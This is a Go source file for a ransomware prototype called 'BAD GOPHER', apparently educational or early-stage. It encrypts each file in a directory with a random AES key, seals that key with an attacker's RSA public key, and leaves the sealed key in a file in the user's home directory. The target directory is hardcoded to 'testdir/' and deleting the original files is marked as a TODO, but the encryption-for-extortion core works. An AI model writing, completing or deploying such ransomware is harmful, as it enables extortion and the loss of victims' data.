package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// Compresses one or many files into a single zip archive file.
// Param 1: file is a file to add to the zip.
func zipFile(filename string) ([]byte, error) {
	// Create buffer to store zipped file
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	// Open file for reading
	fileToZip, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer fileToZip.Close()

	// Get the file information
	info, err := fileToZip.Stat()
	if err != nil {
		return nil, err
	}

	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return nil, err
	}

	// Using FileInfoHeader() above only uses the basename of the file. If we want
	// to preserve the folder structure we can overwrite this with the full path.
	// header.Name = filename

	// Change to deflate to gain compression
	// see http://golang.org/pkg/archive/zip/#pkg-constants
	header.Method = zip.Store

	// Create writer for adding file to zip
	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return nil, err
	}

	// Write the file to the zip
	_, err = io.Copy(writer, fileToZip)

	zipWriter.Close()

	return buf.Bytes(), err
}

// CSPRNG random byte generator
func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)

	if err != nil {
		return nil, err
	}

	return b, nil
}

// Encryption helper function
func encrypt(data []byte, key []byte) []byte {
	block, _ := aes.NewCipher(key)
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext
}

// Decryption helper function
func decrypt(data []byte, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

// Encrypt file and save
func encryptFile(inputFilename string, outputFilename string, key []byte) {
	// Zip file first to preserve metadata
	zippedFile, _ := zipFile(inputFilename)
	f, _ := os.Create(outputFilename)
	defer f.Close()
	f.Write(encrypt(zippedFile, key))
}

// Decrypt file and return contents
func decryptFile(filename string, key []byte) []byte {
	data, _ := ioutil.ReadFile(filename)
	return decrypt(data, key)
}

func main() {
	// TODO: Add command-line arguments for decryption to recover files
	// Another idea: separate user-friendly binary for decrypting with easy to
	// use CLI. Store in this binary with https://github.com/markbates/pkger and
	// extract onto the user's desktop when done.

	magicBytes := []byte("BAD GOPHER\n")
	currentTime := []byte(time.Now().UTC().String() + "\n")
	// decryptPtr := flag.Bool("decrypt", false, "decrypt with given key")

	// Generate the symmetric AES encryption key
	key, _ := generateRandomBytes(32)

	fmt.Printf("Symmetric key: %s\n", hex.EncodeToString(key))

	pubRaw, _ := ioutil.ReadFile("pub.pem")
	pubPem, _ := pem.Decode(pubRaw)
	pubKey, _ := x509.ParsePKCS1PublicKey(pubPem.Bytes)

	// Encrypt the symmetric key with the asymmetric public key
	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(append(magicBytes, currentTime...), key...), nil)

	home, _ := os.UserHomeDir()
	keyFilePath := home + "/BAD_GOPHER.txt"

	// Check if key file exists, if so exit program b/c already encrypted
	if _, err := os.Stat(keyFilePath); err == nil {
		fmt.Printf("Key file exists, exiting")
		return
	}

	// Save the decryption key and other information to the disk
	keyFile, _ := os.Create(keyFilePath)
	keyFile.WriteString(hex.EncodeToString(ciphertext))
	keyFile.Close()

	fmt.Printf("Ciphertext: %s\n", hex.EncodeToString(ciphertext))

	const suffix = ".gopher"
	const startingDirectory = "testdir/"

	// Go through every file in the starting directory and encrypt it
	filepath.Walk(startingDirectory, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Don't encrypt directories
		if info.IsDir() {
			return nil
		}

		// Don't encrypt large files (>2GB)
		if info.Size() > 2000000000 {
			return nil
		}

		// Don't encrypt already encrypted files
		if strings.HasSuffix(info.Name(), suffix) {
			return nil
		}

		// Don't encrypt files that have already been encrypted
		if _, err := os.Stat(path + suffix); err == nil {
			return nil
		}

		// Don't encrypt the decryption key file
		if strings.Contains(info.Name(), "BAD_GOPHER") {
			return nil
		}

		fmt.Println(path, info.Size())
		encryptFile(path, path+".gopher", key)
		// TODO: destroy original file
		return nil
	})
}
